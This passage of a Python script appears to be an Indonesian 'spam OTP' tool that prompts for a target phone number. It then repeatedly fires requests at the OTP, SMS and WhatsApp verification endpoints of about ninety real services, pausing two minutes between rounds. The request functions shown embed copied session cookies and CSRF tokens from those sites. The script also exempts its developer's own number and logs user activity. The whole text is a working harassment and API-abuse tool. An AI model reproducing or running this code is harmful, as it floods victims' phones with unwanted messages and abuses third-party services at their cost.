  -d '{{"otp_type":"WA","phone":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_dreamdubai(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://www.dreamdubai.com/send-sms-web' \\
  -H 'host: www.dreamdubai.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://www.dreamdubai.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.dreamdubai.com/login' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: cquid=||; __cq_dnt=0; dw_dnt=0; dwac_7bec52bd774fafa7db63dd4057=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY%3D|dw-only|||AED|false|Asia%2FDubai|true; cqcid=abvjR9yv05ESdLZnHR91lRWUF1; sid=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY; dwanonymous_4331083bd03400c189943d61e1cec6f3=abvjR9yv05ESdLZnHR91lRWUF1; dwsid=twdRkKTkmCImlUsRMH9LBkPsS5DtqAl3MjcZ87C95egkhfzbVC7cgsGVHXVBcgEW7HRjl0WmItTbDoKBKWbsAQ==; _gcl_au=1.1.1946167819.1787471764; _ga=GA1.1.1950809663.1787471765; _scid=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _scid_r=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _tt_enable_cookie=1; _ttp=01M0PSX8SNJVMS4Z4RMC04KFE5_.tt.1; _fbp=fb.1.1787471766583.518002055353343985; __cq_uuid=abvjR9yv05ESdLZnHR91lRWUF1; __cq_seg=0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00; adjust_web_uuid=01084d62-d6eb-46f0-1e7a-2ea4a6d74006; moe_uuid=f12354a2-ff50-4ca4-a11c-894991f0c79e; _ga_5SBWDJD7BR=GS2.1.s1787471764$o1$g1$t1787471783$j41$l0$h0; ttcsid=1787471766394::iLRSmXWkEDcPZtKcpYlf.1.1787471796796.0::1.-6089.0::30175.5.347.429::0.0.0; ttcsid_CMSC9GJC77U67KV9FM3G=1787471766387::4t-aqwqsjjEKeGJ_Bmt5.1.1787471796797.1' \\
  -H 'priority: u=1, i' \\
  --data-raw 'phoneNumber={phone}&countryCode=%2B62&isApp=false&mode=whatsapp-otp'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_els(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        import random
        import string
        
        name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
        
        curl_cmd = f"""curl -s -X POST 'https://member.els.id/api/publics/membership/auth/otp/register/send' \\
  -H 'host: member.els.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://member.els.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://member.els.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _gcl_au=1.1.838671011.1787470004; _ga=GA1.1.682741423.1787470005; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fels.id%2F; cf_clearance=u6Yw53DFZSn56DwrIlr_ZxIJ9QfqwnH2LibY8_8COnI-1787470010-1.2.1.1-_Yzp10QlUiRV7_dM.hIBu_eQ3j3H1PjSGu1muhrB4u_RL0xoU8qhCyhl.N3cRybkTtmjWUhDR67gbn9HDIdr00a2BrABvmCMw8UEUo0e0aU2M3I9tnuq6rNMdEyNQm4Xba4pBLulS543BCbF.BGwHOhtvHDuLDN5acRtj9dibyAytzGMrvioCMqvNZxo7yxNb2YWZSjJdkyGp9kAwNCxYNl5_1JQFV7BxjNGKWwjsYxwxR.V1NU6M6X60TAIR5e9PLg2EvtnobHKN0BN2L__rm21D8d32j1hU0zbYeg5dAYipblrEk6X1JwYTUMSoO1bxZ8nJOFpq.HJ.1.QBfBb9nzY7jioh7dIdfxkoJ9I73s; _ga_E3DHK5EHFD=GS2.1.s1787470004$o1$g1$t1787470057$j7$l0$h0; ESODA_ELS_MEMBERSHIP=4612f1cd046264b1e30adf495e046db0; _ga_JT6HY1CYT1=GS2.1.s1787470070$o1$g0$t1787470071$j59$l0$h0' \\
  -d '{{"name":"{name}","mobilephone":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_babyhappy(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://club.babyhappydiapers.com/api/registration/resend-otp-phone' \\
  -H 'host: club.babyhappydiapers.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://club.babyhappydiapers.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://club.babyhappydiapers.com/registration' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _gcl_au=1.1.1607778853.1787457141; _ga=GA1.1.345266246.1787457141; _tt_enable_cookie=1; _ttp=01M0PBZ2G221DTCR2TCZP9NR5J_.tt.1; _fbp=fb.1.1787457144780.679918106559872972.AQYAAQIB; ttcsid_D6J6BNRC77UCPJEO2GU0=1787457145405::yZHNrp369Xay2lZSg8Ah.1.1787457156785.1; cphone={phone}; _gcl_gs=2.1.k1$i1787457792$u37029106; _gcl_aw=GCL.1787457796.CjwKCAjwkaXUBhASEiwAZI3ds8_i9ubY7AiAmkjJ6S2JxDvkIP3eWg1n09EdLYlRyHm_otGZPRiQOxoCOH0QAvD_BwE; ttcsid=1787457145411::Ue7LBTLOfkm-jeYclKyU.1.1787457846118.0::1.670669.651725::700582.25.326.828::685893.16.125; ttcsid_D7SQ6T3C77U4TTGIHFM0=1787457145433::EJ3SqZp4PDfpKlkAnNZT.1.1787457846120.1; _ga_KKVZ5M822G=GS2.1.s1787457141$o1$g1$t1787457846$j9$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_pkumayong(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://reservasi.pkumayong.com/reqOTP' \\
  -H 'host: reservasi.pkumayong.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://reservasi.pkumayong.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://reservasi.pkumayong.com/login' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN=eyJpdiI6IlFydHpESGdLMTRCSFR2cmczOUE1b2c9PSIsInZhbHVlIjoiaks0WkgzMEtHVWlMZWY5ZXFlUHVkTmJ2cURNQmw5V0JkeThPcm9MY01jVzZXSUZzc1RQU2RQdnZMOW43NHc1YVBpeldxNVN6V2h6cUpReUZyQkNoeWc9PSIsIm1hYyI6IjM0YzY0NDI3NjE2MjZhMjBmYWQ4ODMzMDRjYTVmYzRlYThiMmEyNTljNjNmNzNjOTNkNmVhYzRkMDM0OGUzNmYifQ%3D%3D; laravel_session=eyJpdiI6ImFPYTl6djJpUGhYWjAxSGJpQThnWlE9PSIsInZhbHVlIjoiaExkQU02Q2diRnczM2RESzNxOTN3enBNYUdhOTRwYWNkSGpoK3ZpNm1QOUxJY3hBZ20yKzJMXC9yc0FReGRQUnlXSXBkS3dLSUxiMFNHelFNSmhpQ3FnPT0iLCJtYWMiOiJmY2IyYzYyYzAyZWE1NjlhYmUxZjlmMGJmNmQ4MTQ3MTMzNTBjMzA4Njc3MzYyYzQ1OTQxNzU5OTc3OTlhMjVhIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw '_token=VNbW1nBJZCtIWp0264iC0O2ao5qVpGRCpX9UW1NW&nohp={phone}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False
                                                                 
def mulai_spam(nomor):
    apis = {
        'singa1': spam_otp_singa_v1,
        'ktakilat': spam_otp_ktakilat,
        'uangme': spam_otp_uangme,
        'adiraku': spam_otp_adiraku,
        'tokopedia': spam_otp_tokopedia,
        'duniagames': spam_otp_duniagames,
        'planetban': spam_otp_planetban,
        'rumah123': spam_otp_rumah123,
        'paper': spam_otp_paperid,
        'singa2': spam_otp_singa_v2,
        'pinhome': spam_otp_pinhome,
        'yogyaonline': spam_otp_yogyaonline,
        'saturdays': spam_otp_saturdays,
        'bantusaku': spam_otp_bantusaku,
        'mengantar': spam_otp_mengantar,
        'kreditpintar': spam_otp_kreditpintar,
        'bunda': spam_otp_bunda,
        'maulagi': spam_otp_maulagi,
        'singa3': spam_otp_singa_v3,
        'beautyhaul': spam_otp_beautyhaul,
        'byu': spam_otp_byu,
        'daihatsu2': spam_otp_astradaihatsu2,
        'daihatsusms': spam_otp_astradaihatsu_sms,
        'verdantu': spam_otp_vedantu,
        'onebunda': spam_otp_onebunda,
        'bonusbelanja': spam_otp_bonusbelanja,
        'swiggy': spam_otp_swiggy,
        'internetrakyat': spam_otp_internetrakyat,
        'tubantoss': spam_otp_toss,
        'singa4': spam_otp_singa_v4,
        'topindowea': spam_otp_topindo_wea,
        'topindokusms': spam_otp_topindosms,
        'pinjamduit': spam_otp_pinjamduit,
        'matahari': spam_otp_matahari,
        'misteraladin': spam_otp_misteraladin,
        'halodoc': spam_otp_halodoc,
        'greensm': spam_otp_greensm,
        'iseller': spam_otp_isellershop,
        'alodoktersms': spam_otp_alodokter_sms,
        'tiptip': spam_otp_tiptip,
        'seva': spam_otp_seva,
        'uatas': spam_otp_uatas,
        'dokterin': spam_otp_dokterin,
        'im3': spam_otp_im3,
        'fastwork': spam_otp_fastwork,
        'speedcashsms': spam_otp_speedcash_sms,
        'optikmelawai': spam_otp_optikmelawai,
        'labamu': spam_otp_labamu,
        'harvestcakes': spam_otp_harvestcakes,
        'kitabisa': spam_otp_kitabisa_wea,
        'cairin': spam_otp_cairin,
        'daihatsuori': spam_otp_daihatsu,
        'singa5': spam_otp_singa_v5,
        'uku': spam_otp_uku,
        'hijup': spam_otp_hijup,
        'toyota': spam_otp_toyota,
        'speedcash': spam_otp_speedcash,
        'nutriclub': spam_otp_nutriclub,
        'oyorooms': spam_otp_oyorooms,
        'eraspace': spam_otp_eraspace,
        'acc': spam_otp_acc,
        'alodokter': spam_otp_alodokter,
        'sidemang': spam_otp_sidemang,
        'watsons': spam_watsons_otp,
        'auto2000': spam_otp_auto2000,
        'carro': spam_otp_carro,
        'kpoin': spam_otp_kpoin,
        'bundasemarang': spam_otp_bundasemarang,
        'erp360': spam_otp_erp360,
        'amaha': spam_otp_amaha,
        'idealz': spam_otp_idealz,
        'myvalue': spam_otp_myvalue,
        'joob': spam_otp_joob,
        'volta': spam_otp_volta,
        'viuum': spam_otp_viuum,
        'jembatani': spam_otp_jembatani,
        'bigseller': spam_otp_bigseller,
        'mapclub': spam_otp_mapclub_sms,
        'mitsubishi': spam_otp_mitsubishi,
        'rivafashion': spam_rivafashion,
        'datascripmall': spam_otp_datascripmall,
        'buccheri': spam_otp_buccheri,
        'jec': spam_otp_jec,
        'generasimaju': spam_otp_generasimaju,
        'norkaroots': spam_otp_norkaroots,
        '99co': spam_otp_99co,
        'cms': spam_otp_bunda_cms,
        'bukuaku': spam_otp_bukuaku,
        'dreamdubai': spam_otp_dreamdubai,
        'els': spam_otp_els,
        'babyhappy': spam_otp_babyhappy,
        'pkumayong': spam_otp_pkumayong,
    }
    for nama_api, fungsi_api in apis.items():
        try:
            fungsi_api(nomor)
        except:
            pass
        time.sleep(1)
              
SESSION_FILE = os.path.expanduser("~/session.json")
OWNER_NUMBERS = ['6285143754083']

def is_owner_number(nomor):
    return nomor in OWNER_NUMBERS

def simpan_sesi(nomor, waktu_kirim):
    try:
        with open(SESSION_FILE, 'w') as f:
            json.dump({'nomor': nomor, 'waktu_kirim': waktu_kirim}, f)
    except:
        pass

def baca_sesi():
    try:
        with open(SESSION_FILE, 'r') as f:
            return json.load(f)
    except:
        return None

def hapus_sesi():
    try:
        os.remove(SESSION_FILE)
    except:
        pass

def spam_countdown(waktu_kirim, durasi=120):
    while True:
        sisa = durasi - int(time.time() - waktu_kirim)
        if sisa <= 0:
            break
        menit = sisa // 60
        detik_sisa = sisa % 60
        waktu = f"{menit:02d}:{detik_sisa:02d}"
        sys.stdout.write(f'\r{m}=================================\n')
        sys.stdout.write(f"{h}Cooldown 2 menit : {waktu}{c}\n")
        sys.stdout.write(f'{m}================================={c}')
        sys.stdout.flush()
        sys.stdout.write('\x1b[2A')
        time.sleep(1)
    sys.stdout.write('\n\n')

def loading_animasi(detik=1, teks="Loading..."):
    animasi = ['\\', '|', '/', '-']
    for i in range(detik * 10):
        sys.stdout.write(f'\r{teks} {animasi[i % 4]}')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * 30 + '\r')
    sys.stdout.flush()

def spam_otp_main():
    os.system("clear")
    print()
    print(f"\033[33;1m Developer : Thxyzz404")
    print()
    loading_animasi(1, "Memuat")
    print(f'{h} Masukkan Nomor Target : 08XXX ')
    nomor = input(f'{c} : ').strip()
    print()
    if nomor:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif not nomor.startswith('62'):
            nomor = '62' + nomor
        
        if is_owner_number(nomor):
            print(f'\n{m}MAU NGAPAIN KOCAK 😂😂{c}')
            input(f'\n{k}Tekan Enter untuk kembali...{c}')
            return None
        
        update_leaderboard(1)
        kirim_log_aktivitas('1 - Spam1', nomor)
        try:
            sesi = baca_sesi()
            if sesi:
                waktu_kirim = sesi.get('waktu_kirim')
                sisa = 120 - int(time.time() - waktu_kirim)
                if sesi.get('nomor') == nomor and (sisa > 0):
                    spam_countdown(waktu_kirim, 120)
            while True:
                update_leaderboard(1)
                kirim_log_aktivitas('1 - Spam2', nomor)
                animasi = ['\\', '|', '/', '-']
                i = 0
                stop_animasi = False                
                def jalanin_animasi():
                    nonlocal i, stop_animasi
                    while not stop_animasi:
                        sys.stdout.write(f'\rMengirim spam... {animasi[i % 4]}')
                        sys.stdout.flush()
                        time.sleep(0.1)
                        i += 1                
                animasi_thread = threading.Thread(target=jalanin_animasi)
                animasi_thread.daemon = True
                animasi_thread.start()
                mulai_spam(nomor)         
                stop_animasi = True
                animasi_thread.join(timeout=0.5)               
                sys.stdout.write('\r' + ' ' * 50 + '\r')
                sys.stdout.flush()                
                waktu_kirim = time.time()
                simpan_sesi(nomor, waktu_kirim)
                spam_countdown(waktu_kirim, 120)
                hapus_sesi()
        except KeyboardInterrupt:
            sys.stdout.write('\n\n\n\n')
            print(f'\n{k} Kembali...')
            time.sleep(1)
    else:
        input(f'{m} Nomor jangan kosong...')
        return None

if __name__ == "__main__":
    spam_otp_main()